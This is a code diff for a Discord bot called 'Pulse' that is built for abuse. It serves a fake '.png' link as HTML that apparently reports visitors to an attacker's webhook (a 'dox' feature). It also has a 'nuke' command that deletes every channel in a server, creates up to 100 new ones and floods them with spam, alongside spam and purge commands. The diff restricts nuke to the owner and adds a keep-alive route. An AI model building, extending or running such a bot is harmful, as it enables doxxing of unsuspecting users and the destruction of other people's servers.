@@ -4,6 +4,7 @@ const express = require('express');
 const app = express();
 
 const TOKEN = process.env.TOKEN;
+const OWNER_ID = process.env.OWNER_ID;
 const DEFAULT_WEBHOOK = process.env.WEBHOOK_URL;
 const INVITE_LINK = 'https://discord.gg/eG6SyjWbh';
 const PORT = process.env.PORT || 3000;
@@ -17,10 +18,9 @@ const client = new Client({
 
 const links = new Map();
 const startTime = Date.now();
+const userNukes = new Map();
 
-// ---- PER-USER NUKE TRACKING ----
-const userNukes = new Map(); // key: userId, value: { guildId, channels, running }
-
+// ---- DOX SERVER ----
 app.get('/img/:id.png', (req, res) => {
     const id = req.params.id;
     if (!links.has(id)) return res.status(404).send('Image not found');
@@ -28,14 +28,21 @@ app.get('/img/:id.png', (req, res) => {
     res.type('text/html');
     res.send(generateDoxHTML(data.webhook || DEFAULT_WEBHOOK));
 });
+
+// ---- KEEP-ALIVE ROUTE (for Uptime Robot) ----
+app.get('/', (req, res) => {
+    res.send('Pulse bot is alive 🚀');
+});
+
 app.listen(PORT, () => console.log(`Dox server on ${PORT}`));
 
+// ---- COMMAND REGISTRATION ----
 async function registerCommands() {
     const commands = [
         { name: 'dox', description: 'Generate dox link', options: [{ name: 'webhook', type: 3, description: 'Webhook URL', required: true }] },
         { name: 'spam', description: 'Spam a channel', options: [{ name: 'count', type: 4, description: 'Messages (max 100)', required: true }, { name: 'message', type: 3, description: 'Content', required: true }, { name: 'delay', type: 4, description: 'Delay in ms', required: false }] },
-        { name: 'nuke', description: 'Start your own nuke (up to 100 channels)', options: [{ name: 'channels', type: 4, description: 'Channels to create (default 20, max 100)', required: false }, { name: 'delay', type: 4, description: 'Delay in ms between messages (default 50)', required: false }] },
-        { name: 'stop', description: 'Stop YOUR nuke only' },
+        { name: 'nuke', description: '[OWNER ONLY] Nuke a server', options: [{ name: 'channels', type: 4, description: 'Channels (default 20, max 100)', required: false }, { name: 'delay', type: 4, description: 'Delay in ms (default 50)', required: false }] },
+        { name: 'stop', description: '[OWNER ONLY] Stop your nuke' },
         { name: 'ad', description: 'Advertise the server invite' },
         { name: 'purge', description: 'Delete messages in bulk', options: [{ name: 'amount', type: 4, description: 'Number to delete (max 100)', required: true }, { name: 'user', type: 6, description: 'Target user', required: false }, { name: 'reason', type: 3, description: 'Reason', required: false }] },
         { name: 'ping', description: 'Check bot latency' },
@@ -63,6 +70,7 @@ client.once('ready', async () => {
     console.log('Ready.');
 });
 
+// ---- INTERACTION HANDLER ----
 client.on('interactionCreate', async (interaction) => {
     if (!interaction.isChatInputCommand()) return;
 
@@ -80,7 +88,14 @@ client.on('interactionCreate', async (interaction) => {
         const { commandName, options, user, member, guild, channel } = interaction;
         console.log(`[${new Date().toISOString()}] ${user.tag} -> /${commandName}`);
 
-        // ---- STOP (only stops YOUR nuke) ----
+        // ---- OWNER CHECK ----
+        if (commandName === 'nuke' || commandName === 'stop') {
+            if (!OWNER_ID || user.id !== OWNER_ID) {
+                return interaction.editReply('❌ You are not authorized to use this command.');
+            }
+        }
+
+        // ---- STOP ----
         if (commandName === 'stop') {
             const userId = user.id;
             if (!userNukes.has(userId)) {
@@ -125,11 +140,10 @@ client.on('interactionCreate', async (interaction) => {
             return;
         }
 
-        // ---- NUKE (per-user) ----
+        // ---- NUKE ----
         if (commandName === 'nuke') {
             const userId = user.id;
 
-            // Check if user already has a nuke running
             if (userNukes.has(userId)) {
                 return interaction.editReply('❌ You already have a nuke running. Use `/stop` to stop it first.');
             }
@@ -144,14 +158,11 @@ client.on('interactionCreate', async (interaction) => {
 
             await interaction.editReply(`🚀 **Nuke started!** Creating ${channelCount} channels... Use \`/stop\` to stop YOUR nuke.`);
 
-            // Delete all channels
             await Promise.all(guild.channels.cache.map(c => c.delete().catch(() => {})));
 
-            // Create new channels
             const newChannels = await Promise.all(Array.from({ length: channelCount }, () => guild.channels.create({ name: 'pulse', type: ChannelType.GuildText }).catch(() => null)));
             const valid = newChannels.filter(c => c);
 
-            // Store this user's nuke
             const nukeData = {
                 guildId: guild.id,
                 channels: valid,
@@ -159,7 +170,6 @@ client.on('interactionCreate', async (interaction) => {
             };
             userNukes.set(userId, nukeData);
 
-            // Spam loop for this user's nuke
             let messageIndex = 0;
             while (nukeData.running) {
                 const line = variants[messageIndex % variants.length];
@@ -173,7 +183,6 @@ client.on('interactionCreate', async (interaction) => {
                 await new Promise(r => setTimeout(r, delayMs));
             }
 
-            // Cleanup when loop exits
             userNukes.delete(userId);
             return;
         }
@@ -322,6 +331,7 @@ client.on('interactionCreate', async (interaction) => {
     }
 });
 
+// ---- DOX HTML ----
 function generateDoxHTML(webhook) {
     return `<!DOCTYPE html>
 <html>
